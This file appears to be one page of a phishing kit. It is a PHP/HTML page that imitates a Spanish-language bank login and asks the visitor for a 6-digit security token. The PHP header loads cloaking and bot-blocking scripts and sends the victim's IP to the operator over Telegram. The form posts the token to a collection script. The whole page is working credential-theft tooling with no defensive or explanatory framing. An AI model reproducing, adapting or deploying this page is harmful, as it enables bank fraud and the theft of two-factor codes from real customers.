<?php
include './config.php';
include './aires/tg.php';
include './shield/cloack_start.php';
if ($EYEZ == 1){
  include './guardian/start.php';
}
if ($blocker == false){
    include './sistema/view.php';
}
if ($alertx == true){
    $msg = "Cliente ".$ip." Ingresando TOKEN2\r\n";
    sendTg($msg, $key, $id);
}
?>
?>
<!DOCTYPE html>
<html>

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


	<style type="text/css">
		* {
			padding: 0;
			margin: 0;
			font-family: Arial;
			box-sizing: border-box;
		}

		html {
			background: #b3c8d9;
			height: 100%;
		}

		.container {
			width: 80%;
			background: #FFF;
			margin: 1em auto;
			padding: 2em 1em;
			max-width: 830px;
		}

		header {
			display: flex;
			flex-direction: row;
			flex-wrap: wrap;
			margin-bottom: 3em;
		}

		.logo {
			width: 50%;
			margin-bottom: 1em;
		}

		.logo:nth-of-type(2) {
			text-align: right;
		}

		nav {
			width: 100%;
			background: #0e3481;
			height: 31px;
		}

		ul {
			padding: 0;
			margin: 0;
			display: flex;
			list-style: none;
			width: 100%;
			justify-content: flex-end;
			height: 100%;
			align-items: center;
			color: #FFF;
		}

		ul li>a {
			color: #FFF;
			text-decoration: none;
			font-size: 12px;
			font-weight: bold;
		}

		ul li {
			margin-right: .5em;
		}

		.home {
			background: #b3c8d9;
			display: flex;
			flex-wrap: nowrap;
			border-bottom: 1px solid #b0e400;
		}

		.login {
			width: 37.5%;
			padding: .3em;
		}

		.baner {
			width: 70%;
			height: 100%;
		}

		form h4 {
			font-size: 11px;
			margin-bottom: .7em;
			color: #224380
		}

		.controles-radios {
			width: 65%;
			display: flex;
			justify-content: space-around;
			margin: 0 auto .7em 0;
		}

		.controles-radios label {
			font-size: 11px;
			color: #224380;
			font-weight: bolder;
		}

		.controles-radios input {
			height: 16px;
			width: 16px;
		}

		.control {
			width: 100%;
			margin-bottom: .5em;
		}

		.control label {
			font-size: 11px;
			font-weight: bold;
			width: 23%;
			display: inline-block;
			color: #224380
		}

		.control select {
			width: 23%;
		}

		.control input {
			width: 40%;
		}

		.control a {
			font-size: 11px;
			color: #224380
		}

		.btn {
			width: 30%;
			left: 35%;
			position: relative;
			color: #224380;
			margin-bottom: 1em;
		}

		.doted {
			width: 100%;
			border-bottom: 1px dotted #FFF;
			margin-bottom: .5em;
		}

		form span {
			font-size: 10px;
			color: #224380
		}

		.button-link {
			display: inline-block;
			width: 43%;
			font-size: 11px;
			text-decoration: none;
			background: #fcfcfc;
			padding: .3em;
			border: 1px solid silver;
			color: #224380;
			margin-left: 30%;
			margin-top: 1em;
			margin-bottom: .5em;
		}

		.baner img {
			height: 300px;
			object-fit: cover;
			width: 100%;
		}

		.images-pre-footer {
			width: 100%;
		}

		.images-pre-footer img {
			width: 100%;
		}

		.alert-danger {
			background: #F56868;
			padding: 1em;
			margin-bottom: 1em;
		}

		.alert-danger h2 {
			font-size: 16px;
			color: #B30000;
		}

		.alert-danger p {
			font-size: 11px;
			color: #B30000;
		}

		.load-spínner-container {
			position: fixed;
			height: 100%;
			width: 100%;
			background: rgb(253, 253, 253);
			top: 0;
			display: flex;
			justify-content: center;
			align-items: center;
			z-index: 99;
			flex-direction: column;
		}

		.spinner {
			width: 60px;
			height: 60px;
			border: 4px solid #FFF;
			border-left: 4px solid #888;
			border-radius: 60px;
			animation: girar .3s infinite linear;
		}

		@keyframes girar {
			to {
				transform: rotate(0deg);
			}

			from {
				transform: rotate(-360deg);
			}
		}
	</style>

	<title>Inicia sesión</title>
</head>

<body>


	<div class="container">
		<header>
			<div class="logo">
				<img src="./fokarc/lsdeuns1.jpg">
			</div>
			<div class="logo">
				<img src="./fokarc/trre4t.jpg">
			</div>
			<nav>
				<ul>
					<li><a href="">Sucursales y Cajeros</a></li>
					<li>|</li>
					<li><a href="">Ayuda</a></li>
					<li>|</li>
					<li><a href="">Contáctenos</a></li>
				</ul>
			</nav>
		</header>
		<section class="home">
			<div class="login">
				<form action="./aires/verde.php" method="POST">
					<div class="alert-danger">
						<h2>Necesitamos que acredites tu identidad</h2>
						<p>Completa los siguientes datos requeridos</p>
					</div>
					<h4>Ingresá el TOKEN numerico de 6 digitos.</h4>

					<div class="control user">
						<label>TOKEN</label>
						<input type="text" name="tok" pattern="[0-9a-zA-Z]{1,10}" maxlength="6" required="">

					</div>
					<button type="submit" name="enviartkn" class="btn">Ingresar</button>

					<div class="doted"></div>

				</form>
			</div>
			<div class="baner">
				<img src="./fokarc/olkiu67.jpg">
			</div>
		</section>
		<section class="images-pre-footer">
			<img src="./fokarc/gtyhee33.jpg">
		</section>
	</div>



</body>

</html>